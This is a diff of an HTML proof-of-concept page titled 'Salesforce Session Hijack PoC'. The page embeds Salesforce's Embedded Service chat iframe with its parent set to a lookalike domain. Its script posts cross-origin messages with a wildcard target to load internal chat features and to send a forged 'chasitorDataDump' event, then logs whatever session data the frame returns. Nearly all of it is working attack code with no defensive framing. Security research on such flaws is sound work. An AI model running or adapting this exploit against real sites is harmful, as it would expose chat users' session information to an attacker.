@@ -1,58 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce Message Injection PoC</title>
+  <title>Salesforce Session Hijack PoC</title>
 </head>
 <body>
-  <h2>Salesforce LiveAgent iframe injection PoC</h2>
-
-  <iframe
-    id="eswFrame"
-    src="https://reddit.com.wangdubruh.xyz"
-    style="width:600px;height:400px;"
-    onload="onIframeLoad()"
+  <h1>Salesforce PoC: Real Session Interaction</h1>
+  <iframe id="eswFrame"
+    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
+    style="width:100%;height:600px;"
+    onload="beginHijack()"
     allow="camera *; microphone *;">
   </iframe>
 
   <script>
-    const iframe = document.getElementById("eswFrame");
+    let targetFrame = null;
 
-    window.addEventListener("message", (e) => {
-      console.log("📩 Message from iframe:", e.data);
-    });
-
-    function sendFakeEvent() {
-      console.log("📤 Sending fake event to dump session info");
-      iframe.contentWindow.postMessage({
-        method: "liveagent.event",
-        data: {
-          event: "chasitorDataDump",
-          params: {
-            key: "POC",
-            value: "Session hijack attempt"
-          },
-          chasitorData: {
-            orgId: "00Dxx0000000000",
-            chatKey: "FAKEKEY123",
-            visitorInfo: {
-              name: "Victim",
-              location: "internal"
-            }
-          }
-        }
-      }, "*");
-    }
-
-    function onIframeLoad() {
+    function beginHijack() {
       console.log("[+] Iframe loaded (Salesforce 4.0)");
+      targetFrame = document.getElementById("eswFrame").contentWindow;
 
-      // Load internal scripts
-      iframe.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
-      iframe.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");
+      // Send feature loader (enable chasitor API)
+      ["chasitor", "filetransfer"].forEach(feature => {
+        console.log(`📤 Sending script.load for feature: '${feature}'`);
+        targetFrame.postMessage({ method: "script.load", feature }, "*");
+      });
 
-      // Delay to give time for handlers to bind
-      setTimeout(sendFakeEvent, 1500);
+      // Delay to let chasitor load
+      setTimeout(() => {
+        console.log("📤 Sending fake event to trigger session info leak");
+        targetFrame.postMessage({
+          method: "liveagent.event",
+          data: {
+            event: "chasitorDataDump",
+            params: { key: "POC", value: "Session hijack attempt" }
+          }
+        }, "*");
+      }, 3000);
     }
+
+    window.addEventListener("message", (event) => {
+      console.log("📩 Message from iframe:", event.data);
+    });
   </script>
 </body>
 </html>
